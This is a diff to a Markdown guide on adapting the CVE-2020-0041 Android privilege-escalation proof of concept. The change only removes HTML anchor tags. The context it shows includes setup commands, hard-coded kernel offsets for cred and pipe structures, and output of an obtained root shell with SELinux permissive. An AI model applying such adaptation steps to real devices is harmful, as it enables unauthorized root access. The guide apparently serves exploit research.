@@ -16,8 +16,6 @@ A common procedure in the industry is the adaptation of privilege escalation exp
 - [Testing the exploit](#testing-the-exploit)
 - [Improvements](#improvements)
 
-<a name="requirements">
-
 ## Requirements
 
 * Download the **CVE-2020-0041** PoC exploit that we will be using for the modifications:
@@ -54,9 +52,6 @@ sudo pip3 install --upgrade lz4 git+https://github.com/marin-m/vmlinux-to-elf
 ```bash
 export NDK="/home/calabres/NDK"
 ```
-</a>
-
-<a name="procedure">
 
 ## Procedure
 
@@ -97,9 +92,6 @@ OFFSET_PIPE_FOP
 #define INIT_CRED_OFFSET 0x2db0238
 #define OFFSET_PIPE_FOP 0x2173650
 ```
-</a>
-
-<a name="testing">
 
 ## Testing the exploit 
 
@@ -147,13 +139,9 @@ root_by_cve-2020-0041:/ # getenforce
 Permissive
 root_by_cve-2020-0041:/ # 
 ```
-</a>
-
-<a name="improvements">
 
 ## Improvements
 
 After adapting the exploit, you will obtain a root shell; however, the shell will be very limited and not fully working.
 
 In order to ... //TODO
-</a>
